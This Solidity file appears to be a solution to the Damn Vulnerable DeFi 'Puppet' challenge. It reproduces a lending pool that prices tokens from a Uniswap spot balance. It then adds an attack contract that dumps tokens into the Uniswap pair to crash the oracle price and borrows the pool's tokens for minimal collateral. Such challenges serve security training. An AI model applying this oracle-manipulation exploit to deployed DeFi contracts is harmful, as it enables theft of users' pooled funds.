// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

interface Iuniswap{
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

contract IPuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired)
            revert NotEnoughCollateral();

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }
    //I'm guessing if send a bunch of eth or DVT to the uniswap contract we can make one of them worth significantly less and take them out
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}

contract puppetPoolAttack{
    IPuppetPool public immutable puppetPool;
    Iuniswap public immutable uniswapPool;
    address public immutable player;
    DamnValuableToken public immutable token;
    constructor(address _puppetPool, address _player, address _token, address _uniswapPool){
        puppetPool = IPuppetPool(_puppetPool);
        uniswapPool = Iuniswap(_uniswapPool);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function attackPuppet() public payable{        
        //step one deposit a lot of DVT to the publicly known oracle pool - ether is just a shortcut for 18 decimal num (10*18)
        token.approve(address(uniswapPool), 1000 ether);
        uniswapPool.tokenToEthTransferInput( 1000 ether, 9, block.timestamp, address(this));
        //step 2 calculate how much we need
        uint256 amountNeeded = puppetPool.calculateDepositRequired(100000 ether) ;
        //uint256 tokenPrice = address(uniswapPool).balance * (10 ** 18) / token.balanceOf(address(uniswapPool));
       // uint256 amountNeeded = 100000 ether * tokenPrice * 2 / 10 ** 18;
        //step 3 borrow as much as we can
        puppetPool.borrow{value: amountNeeded}(100000 ether, player);
    }
    receive() external payable {}

}